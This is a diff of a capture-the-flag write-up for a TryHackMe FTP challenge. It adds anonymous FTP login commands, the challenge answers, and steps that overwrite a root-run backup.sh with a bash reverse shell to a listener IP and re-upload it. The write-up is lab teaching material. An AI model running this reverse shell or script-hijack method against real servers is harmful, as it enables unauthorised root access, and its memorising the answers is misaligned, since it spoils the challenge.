@@ -21,27 +21,79 @@ The standard for these two connections are the two ports:
 
 ## Challenge
 
-Name the directory on the FTP server that has data accessible by the "anonymous" user 
+Name the directory on the FTP server that has data accessible by the "anonymous" user
+
+```text
+ftp 10.10.130.142
+anonymous
+ls
+```
+
+![](../.gitbook/assets/image%20%2855%29.png)
 
 {% hint style="success" %}
-
+public
 {% endhint %}
 
 What script gets executed within this directory?
 
-{% hint style="success" %}
+```text
+ftp 10.10.130.142
+anonymous
+ls
+cd public
+ls
+```
 
+![](../.gitbook/assets/image%20%2850%29.png)
+
+{% hint style="success" %}
+backup.sh
 {% endhint %}
 
 What movie did Santa have on his Christmas shopping list?
 
-{% hint style="success" %}
+```text
+ftp 10.10.130.142
+anonymous
+cd public
+get shoppinglist.txt
+quit
+cat shoppinglist.txt
+```
 
+![](../.gitbook/assets/image%20%287%29.png)
+
+{% hint style="success" %}
+The Polar Express
 {% endhint %}
 
 Re-upload this script to contain malicious data \(just like we did in section **9.6**. Output the contents of /root/flag.txt!
 
-Note that the script that we have uploaded may take a minute to return a connection. If it doesn't after a couple of minutes, double-check that you have set up a Netcat listener on the device that you are working from, and have provided the TryHackMe IP of the device that you are connecting from. 
+Note that the script that we have uploaded may take a minute to return a connection. If it doesn't after a couple of minutes, double-check that you have set up a Netcat listener on the device that you are working from, and have provided the TryHackMe IP of the device that you are connecting from.
+
+```text
+ftp 10.10.130.142
+anonymous
+cd public
+get backup.sh
+```
+
+![](../.gitbook/assets/image%20%2846%29.png)
+
+```text
+vi backup.sh
+
+bash -i >& /dev/tcp/10.14.4.204/4444 0>&1
+```
+
+![](../.gitbook/assets/image%20%2815%29.png)
+
+```text
+put backup.sh
+```
+
+![](../.gitbook/assets/image%20%285%29.png)
 
 {% hint style="success" %}
 
